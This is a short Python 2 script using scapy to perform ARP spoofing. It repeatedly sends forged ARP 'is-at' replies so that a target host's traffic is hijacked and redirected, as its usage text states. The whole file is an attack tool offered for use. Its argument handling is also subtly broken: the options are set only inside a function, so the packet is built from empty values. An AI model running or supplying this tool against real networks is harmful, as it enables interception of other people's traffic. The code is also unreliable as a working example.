#!/usr/bin/env python
# ---- coding: UTF8 ----
import sys, time
from scapy.all import sendp, ARP, Ether, ifaces, conf

# Get local interface, target IP, Spoof IP
def getOptions():
	if len(sys.argv) < 4:
		print "Usage: %s: <iface> <Target IP> <Spoof IP>"%(sys.argv[0])
		print "iface: The interface that will send ARP requests"
		print "Target IP: The IP that you want to hijack traffic"
		print "Spoof IP: The IP that you want to redirect traffic"
		sys.exit(1)
	else:
		iface 		= sys.argv[1]
		target_ip 	= sys.argv[2]
		spoof_ip 	= sys.argv[3]

def arpResponse():
	# Create the Ethernet header
	eth_header = Ether()
	# Create the ARP header
	arp_header = ARP(pdst = target_ip, psrc = spoof_ip, op = "is-at")
	return (eth_header / arp_header)

if __name__ == '__main__':
	# Get command line options
	iface 		= ''
	target_ip 	= ''
	spoof_ip 	= ''
	getOptions()
	packet = arpResponse()
	while True:
		sendp(packet, iface=iface)
		time.sleep(10)
